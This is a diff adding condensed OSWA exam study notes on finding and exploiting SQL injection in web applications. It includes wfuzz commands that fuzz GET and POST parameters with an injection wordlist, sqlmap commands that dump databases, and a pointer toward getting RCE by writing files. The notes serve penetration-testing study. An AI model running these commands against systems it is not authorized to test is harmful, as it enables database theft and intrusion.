@@ -122,3 +122,28 @@
 #
 
 
+## Condensed Notes
+This is a condensed version of the notes I used during OSWA and are by no means complete. Make your own notes and methodology, building off these basic steps. 
+
+- Identify inputs into the application, specifically target any area that looks like it could have interaction with a database, for example login forms, search boxes etc.
+- Use automated tools like Wfuzz to help test potentially vulnerable parameters:
+```bash
+#fuzzing GET parameter
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "http://site.com/index.php?id=FUZZ"
+​
+#fuzzing POST parameter
+wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "http://site.com/index.php"
+```
+- Use SQLMap - Spend time learning how SQLMap works, it is allowed in the exam and is extremelyt useful! I'd recommend exporting requests into txt files, marking vulnerable params with * and importing using -r as shown below:
+```bash
+# With exported request
+sqlmap -r request_file.txt --dump
+
+# Manual POST
+sqlmap -u http://www.example.com/api --method POST --data "name=taco&sort=id&order=asc" -p "name,sort,order"
+
+# Manual GET
+sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
+```
+- Burp Suite will attempt to discover SQL Injection vulnerabilities during an active scan.
+- If discovered, understand the DB in question, read the docs and learn how to exploit this further. Can you get RCE by writing to files? 
